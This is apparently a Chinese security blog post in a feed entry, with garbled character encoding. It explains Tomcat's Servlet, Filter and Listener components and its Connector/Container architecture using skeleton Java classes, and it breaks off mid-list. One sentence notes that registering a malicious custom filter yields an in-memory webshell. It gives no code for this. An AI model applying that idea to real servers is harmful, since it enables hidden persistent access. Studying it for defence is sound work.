    <published>2023-07-31T17:07:08.000Z</published>
    <updated>2024-06-09T05:19:18.079Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x01-å‰è¨€"><a class="markdownIt-Anchor" href="#0x01-å‰è¨€">#</a> 0x01 å‰è¨€</h2><p>ç†Ÿæ‚‰ä¸€ä¸‹ Tomcat æ¡†æ¶</p><h2 id="0x02-java-web-ä¸‰å¤§ä»¶"><a class="markdownIt-Anchor" href="#0x02-java-web-ä¸‰å¤§ä»¶">#</a> 0x02 Java web ä¸‰å¤§ä»¶</h2><p>Servletï¼ŒFilterï¼ŒListener</p><p>å½“ Tomcat æ¥æ”¶åˆ°è¯·æ±‚æ—¶å€™ï¼Œä¾æ¬¡ä¼šç»è¿‡ Listener -&gt; Filter -&gt; Servlet</p><h3 id="servlet"><a class="markdownIt-Anchor" href="#servlet">#</a> Servlet</h3><h4 id="æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#æ¦‚å¿µ">#</a> æ¦‚å¿µ</h4><p>Java Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/ServletLike.png" alt="img"></p><h4 id="è¯·æ±‚æµç¨‹"><a class="markdownIt-Anchor" href="#è¯·æ±‚æµç¨‹">#</a> è¯·æ±‚æµç¨‹</h4><p>å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ª http è¯·æ±‚ï¼Œæ¯”å¦‚ get ç±»å‹ã€‚</p><p>Servlet å®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆ HttpServletRequest å’Œ HttpServletResponse å¯¹è±¡ã€‚è¿™æ­¥ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ä¼ å‚ã€‚</p><p>Servlet å®¹å™¨è°ƒç”¨ HttpServlet çš„ init () æ–¹æ³•ï¼Œinit æ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚</p><p>Servlet å®¹å™¨è°ƒç”¨ service () æ–¹æ³•ã€‚</p><p>service () æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œè¿™é‡Œæ˜¯ get ç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨ doGet æˆ–è€… doPost æ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨ doGet æ–¹æ³•ã€‚</p><p>doXXX æ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p>ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™ Servlet å®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨ destory æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// åŸºç¡€æ¶æ„ç±»  </span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿå‘½å‘¨æœŸ"><a class="markdownIt-Anchor" href="#ç”Ÿå‘½å‘¨æœŸ">#</a> ç”Ÿå‘½å‘¨æœŸ</h4><blockquote><p>1ï¼‰æœåŠ¡å™¨å¯åŠ¨æ—¶ (web.xml ä¸­é…ç½® load-on-startup=1ï¼Œé»˜è®¤ä¸º 0) æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥ servlet æ—¶ï¼Œå°±ä¼šåˆå§‹åŒ–ä¸€ä¸ª Servlet å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• init (ServletConfig conf)ã€‚</p><p>2ï¼‰servlet å¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨ service (ServletRequest reqï¼ŒServletResponse res) æ–¹æ³•ä¸­æ‰§è¡Œ</p><p>3ï¼‰æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ª servlet å¯¹è±¡ï¼Œæ‰§è¡Œ destroy () æ–¹æ³•ã€‚</p><p>4ï¼‰ç”± JVM è¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p></blockquote><h3 id="filter"><a class="markdownIt-Anchor" href="#filter">#</a> Filter</h3><h4 id="æ¦‚å¿µ-2"><a class="markdownIt-Anchor" href="#æ¦‚å¿µ-2">#</a> æ¦‚å¿µ</h4><blockquote><p>filter ä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ Servlet æŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨ HttpServletRequest åˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„ HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥ HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨ HttpServletResponse åˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆª HttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥ HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ HttpServletResponse å¤´å’Œæ•°æ®ã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/filterWorking.png" alt="img"></p><p>è¿™é‡Œå¦‚æœæˆ‘ä»¬è‡ªå·±åˆ›å»ºä¸€ä¸ª filterï¼Œæ”¾åœ¨æ­£å¸¸æµç¨‹çš„ filter ä¹‹å‰ï¼Œå¹¶ä¸”å°†æ¶æ„ä»£ç æ³¨å†Œè¿›å»ï¼Œé‚£å°±å¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œæ•ˆæœï¼Œä¹Ÿå°±æˆä¸ºäº†ä¸€ä¸ªå†…å­˜ webshell</p><h4 id="åŸºæœ¬å·¥ä½œåŸç†"><a class="markdownIt-Anchor" href="#åŸºæœ¬å·¥ä½œåŸç†">#</a> åŸºæœ¬å·¥ä½œåŸç†</h4><blockquote><p>1ã€Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„ Java ç±»ï¼Œä¸ Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”± Servlet å®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ã€‚</p><p>2ã€å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ª Filter æ¥å¯¹æŸä¸ª Servlet ç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚</p><p>3ã€å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚</p><p>4ã€ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ—¶é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚</p><p>5ã€åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚</p><p>6ã€å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´</p><p>Filter ä¸­çš„ Filter è®¿é—®éœ€è¦åœ¨ web.xml é‡Œé¢å®šä¹‰è·¯å¾„</p><p>Filter æœ‰ä¸€æ¡ FilterChainï¼Œä¹Ÿå°±æ˜¯ç”±å¤šä¸ª Filter ç»„æˆçš„ï¼Œä¼šè¿›è¡Œä¸€ä¸ªä¸ªçš„ Filter æ“ä½œï¼Œæœ€åä¸€ä¸ª Filter æœ€åä¼šæ‰§è¡Œ Servlet.service ()</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809100404774.png" alt="image-20230809100404774"></p><h4 id="ç”Ÿå‘½å‘¨æœŸ-2"><a class="markdownIt-Anchor" href="#ç”Ÿå‘½å‘¨æœŸ-2">#</a> ç”Ÿå‘½å‘¨æœŸ</h4><blockquote><p>ä¸ servlet ä¸€æ ·ï¼ŒFilter çš„åˆ›å»ºå’Œé”€æ¯ä¹Ÿç”± Web å®¹å™¨è´Ÿè´£ã€‚Web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼ŒWeb æœåŠ¡å™¨å°†åˆ›å»º Filter çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ init () æ–¹æ³•ï¼Œè¯»å– web.xml é…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œï¼ˆfilter å¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinit æ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚å¼€å‘äººå‘˜é€šè¿‡ init æ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰ filter é…ç½®ä¿¡æ¯çš„ FilterConfig å¯¹è±¡ã€‚ Filter å¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“ Web åº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ã€‚åœ¨ Web å®¹å™¨å¸è½½ Filter å¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ã€‚è¯¥æ–¹æ³•åœ¨ Filter çš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æºã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="comment">// åœ¨è¿™é‡Œé¢è¿›è¡Œ doGet å’Œ doPost è¿™ç§ç±»ä¼¼çš„  </span></span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="filteré“¾"><a class="markdownIt-Anchor" href="#filteré“¾">#</a> Filter é“¾</h4><blockquote><p>å½“å¤šä¸ª Filter åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº† Filter é“¾ã€‚Web æœåŠ¡å™¨æ ¹æ® Filter åœ¨ web.xml æ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ª Filterã€‚å½“ç¬¬ä¸€ä¸ª Filter çš„ doFilter æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œweb æœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨ Filter é“¾çš„ FilterChain å¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­ FilterChain ä¸­æ˜¯å¦è¿˜æœ‰ Filter å†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨ Filterã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/FilterChain.png" alt="img"></p><h3 id="listener"><a class="markdownIt-Anchor" href="#listener">#</a> Listener</h3><h4 id="æ¦‚å¿µ-3"><a class="markdownIt-Anchor" href="#æ¦‚å¿µ-3">#</a> æ¦‚å¿µ</h4><blockquote><p>Java Web å¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯ Applicationã€Session å’Œ Request ä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</p><p>ServletContextListenerï¼šå¯¹ Servlet ä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletContextAttributeListenerï¼šç›‘å¬ Servlet ä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼›</p><p>HttpSessionListenerï¼šå¯¹ Session çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Session çš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­ Session è¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨ Session å¯¹è±¡çš„ invalidate () æ–¹æ³•ä½¿ session å¤±æ•ˆã€‚</p><p>HttpSessionAttributeListenerï¼šå¯¹ Session å¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚</p></blockquote><h2 id="0x03-tomcatåŸºç¡€ä»‹ç»"><a class="markdownIt-Anchor" href="#0x03-tomcatåŸºç¡€ä»‹ç»">#</a> 0x03 Tomcat åŸºç¡€ä»‹ç»</h2><blockquote><p>Apache æ˜¯ Web æœåŠ¡å™¨ï¼ˆé™æ€è§£æï¼Œå¦‚ HTMLï¼‰ï¼ŒTomcat æ˜¯ java åº”ç”¨æœåŠ¡å™¨ï¼ˆåŠ¨æ€è§£æï¼Œå¦‚ JSPï¼‰</p><p>Tomcat åªæ˜¯ä¸€ä¸ª servlet (jsp ä¹Ÿç¿»è¯‘æˆ servlet) å®¹å™¨ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ Apache çš„æ‰©å±•ï¼Œä½†æ˜¯å¯ä»¥ç‹¬ç«‹äº Apache è¿è¡Œã€‚</p></blockquote><h2 id="0x04-tomcatæ¶æ„"><a class="markdownIt-Anchor" href="#0x04-tomcatæ¶æ„">#</a> 0x04 Tomcat æ¶æ„</h2><p>ä¸»è¦æœ‰ serverã€serviceã€connectorã€container å››ä¸ªéƒ¨åˆ†</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatStage.png" alt="img"></p><p>å›¾ä¸­å¯ä»¥çœ‹å‡º Tomcat çš„å¿ƒè„æ˜¯ä¸¤ä¸ªç»„ä»¶ï¼šConnector å’Œ Containerï¼š<br>Connector ä¸»è¦è´Ÿè´£å¯¹å¤–äº¤æµï¼Œè¿›è¡Œ Socket é€šä¿¡ (åŸºäº TCP/IP)ï¼Œè§£æ HTTP æŠ¥æ–‡ï¼Œå¯¹åº”ä¸‹å›¾ä¸­çš„ http æœåŠ¡å™¨ï¼›</p><p>Container ä¸»è¦å¤„ç† Connector æ¥å—çš„è¯·æ±‚ï¼Œä¸»è¦æ˜¯å¤„ç†å†…éƒ¨äº‹åŠ¡ï¼ŒåŠ è½½å’Œç®¡ç† Servletï¼Œç”± Servlet å…·ä½“è´Ÿè´£å¤„ç† Request è¯·æ±‚ï¼Œå¯¹åº”ä¸‹å›¾ä¸­çš„ servlet å®¹å™¨ã€‚</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatUse.png" alt="img"></p><h4 id="server"><a class="markdownIt-Anchor" href="#server">#</a> Server</h4><blockquote><p>å³æœåŠ¡å™¨ï¼Œä»£è¡¨æ•´ä¸ª Tomcat æœåŠ¡å™¨ï¼Œå®ƒè¦èƒ½å¤Ÿæä¾›ä¸€ä¸ªæ¥å£è®©å…¶å®ƒç¨‹åºèƒ½å¤Ÿè®¿é—®åˆ°è¿™ä¸ª Service é›†åˆã€åŒæ—¶è¦ç»´æŠ¤å®ƒæ‰€åŒ…å«çš„æ‰€æœ‰ Service çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬å¦‚ä½•åˆå§‹åŒ–ã€å¦‚ä½•ç»“æŸæœåŠ¡ã€å¦‚ä½•æ‰¾åˆ°åˆ«äººè¦è®¿é—®çš„ Serviceã€‚è¿˜æœ‰å…¶å®ƒçš„ä¸€äº›æ¬¡è¦çš„ä»»åŠ¡</p></blockquote><h4 id="service"><a class="markdownIt-Anchor" href="#service">#</a> Service</h4><blockquote><p>Service ä¸»è¦æ˜¯ä¸ºäº†å…³è” Connector å’Œ Containerï¼ŒåŒæ—¶ä¼šåˆå§‹åŒ–å®ƒä¸‹é¢çš„å…¶å®ƒç»„ä»¶ï¼Œåœ¨ Connector å’Œ Container å¤–é¢å¤šåŒ…ä¸€å±‚ï¼ŒæŠŠå®ƒä»¬ç»„è£…åœ¨ä¸€èµ·ï¼Œå‘å¤–é¢æä¾›æœåŠ¡ï¼Œä¸€ä¸ª Service å¯ä»¥è®¾ç½®å¤šä¸ª Connectorï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ª Container å®¹å™¨ã€‚</p><p>Tomcat ä¸­ Service æ¥å£çš„æ ‡å‡†å®ç°ç±»æ˜¯ StandardService ï¼Œå®ƒä¸ä»…å®ç°äº† Service å€Ÿå£åŒæ—¶è¿˜å®ç°äº† Lifecycle æ¥å£ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥æ§åˆ¶å®ƒä¸‹é¢çš„ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸäº†</p></blockquote><h4 id="connecter"><a class="markdownIt-Anchor" href="#connecter">#</a> Connecter</h4><blockquote><p>Connector ç»„ä»¶æ˜¯ Tomcat ä¸­ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œå®ƒçš„ä¸»è¦ä»»åŠ¡æ˜¯è´Ÿè´£æ¥æ”¶æµè§ˆå™¨çš„å‘è¿‡æ¥çš„ tcp è¿æ¥è¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ª Request å’Œ Response å¯¹è±¡åˆ†åˆ«ç”¨äºå’Œè¯·æ±‚ç«¯äº¤æ¢æ•°æ®ï¼Œç„¶åä¼šäº§ç”Ÿä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚å¹¶æŠŠäº§ç”Ÿçš„ Request å’Œ Response å¯¹è±¡ä¼ ç»™å¤„ç†è¿™ä¸ªè¯·æ±‚çš„çº¿ç¨‹ï¼Œå¤„ç†è¿™ä¸ªè¯·æ±‚çš„çº¿ç¨‹å°±æ˜¯ Container ç»„ä»¶è¦åšçš„äº‹äº†ã€‚</p></blockquote><blockquote><p>socket é€šä¿¡<br>è§£æå¤„ç†åº”ç”¨å±‚åè®®ï¼Œå¦‚å°† socket è¿æ¥å°è£…æˆ request å’Œ response å¯¹è±¡ï¼Œåç»­äº¤ç»™ Container æ¥å¤„ç†<br>å°† Request è½¬æ¢ä¸º ServletRequestï¼Œå°† Response è½¬æ¢ä¸º ServletResponse</p></blockquote><p>å…¶ä¸­ Tomcat è®¾è®¡äº†ä¸‰ä¸ªç»„ä»¶ï¼Œå…¶è´Ÿè´£åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ul><li>EndPoint: è´Ÿè´£ç½‘ç»œé€šä¿¡ï¼Œå°†å­—èŠ‚æµä¼ é€’ç»™ Processorï¼›</li><li>Processor: è´Ÿè´£å¤„ç†å­—èŠ‚æµç”Ÿæˆ Tomcat Request å¯¹è±¡ï¼Œå°† Tomcat Request å¯¹è±¡ä¼ é€’ç»™ Adapterï¼›</li><li>Adapter: è´Ÿè´£å°† Tomcat Request å¯¹è±¡è½¬åŒ–æˆ ServletRequest å¯¹è±¡ï¼Œä¼ é€’ç»™å®¹å™¨ã€‚</li></ul><h4 id="adapterç»„ä»¶"><a class="markdownIt-Anchor" href="#adapterç»„ä»¶">#</a> Adapter ç»„ä»¶</h4><blockquote><p>ç”±äºåè®®çš„ä¸åŒï¼ŒTomcat å®šä¹‰äº†è‡ªå·±çš„ Request ç±»æ¥å­˜æ”¾è¯·æ±‚ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªä¸æ˜¯æ ‡å‡†çš„ ServletRequestã€‚äºæ˜¯éœ€è¦ä½¿ç”¨ Adapter å°† Tomcat Request å¯¹è±¡è½¬æˆ ServletRequest å¯¹è±¡ï¼Œç„¶åå°±èƒ½è°ƒç”¨å®¹å™¨çš„ service æ–¹æ³•ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼ŒEndpoint æ¥æ”¶åˆ° Socket è¿æ¥åï¼Œç”Ÿæˆä¸€ä¸ª SocketProcessor ä»»åŠ¡æäº¤åˆ°çº¿ç¨‹æ± è¿›è¡Œå¤„ç†ï¼ŒSocketProcessor çš„ run æ–¹æ³•å°†è°ƒç”¨ Processor ç»„ä»¶è¿›è¡Œåº”ç”¨å±‚åè®®çš„è§£æï¼ŒProcessor è§£æåç”Ÿæˆ Tomcat Request å¯¹è±¡ï¼Œç„¶åä¼šè°ƒç”¨ Adapter çš„ Service æ–¹æ³•ï¼Œæ–¹æ³•å†…éƒ¨é€šè¿‡å¦‚ä¸‹ä»£ç å°† Request è¯·æ±‚ä¼ é€’åˆ°å®¹å™¨ä¸­ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatConnector.png" alt="img"></p><h4 id="container"><a class="markdownIt-Anchor" href="#container">#</a> Container</h4><blockquote><p>Containerï¼ˆåˆå Catalinaï¼‰ç”¨äºå¤„ç† Connector å‘è¿‡æ¥çš„ servlet è¿æ¥è¯·æ±‚ï¼Œå®ƒæ˜¯å®¹å™¨çš„çˆ¶æ¥å£ï¼Œæ‰€æœ‰å­å®¹å™¨éƒ½å¿…é¡»å®ç°è¿™ä¸ªæ¥å£ï¼ŒContainer å®¹å™¨çš„è®¾è®¡ç”¨çš„æ˜¯å…¸å‹çš„è´£ä»»é“¾çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒæœ‰å››ä¸ªå­å®¹å™¨ç»„ä»¶æ„æˆï¼Œåˆ†åˆ«æ˜¯ï¼šEngineã€Hostã€Contextã€Wrapperï¼Œè¿™å››ä¸ªç»„ä»¶ä¸æ˜¯å¹³è¡Œçš„ï¼Œè€Œæ˜¯çˆ¶å­å…³ç³»ï¼ŒEngine åŒ…å« Hostï¼ŒHost åŒ…å« Contextï¼ŒContext åŒ…å« Wrapperã€‚</p></blockquote><blockquote><ul><li>Engine: 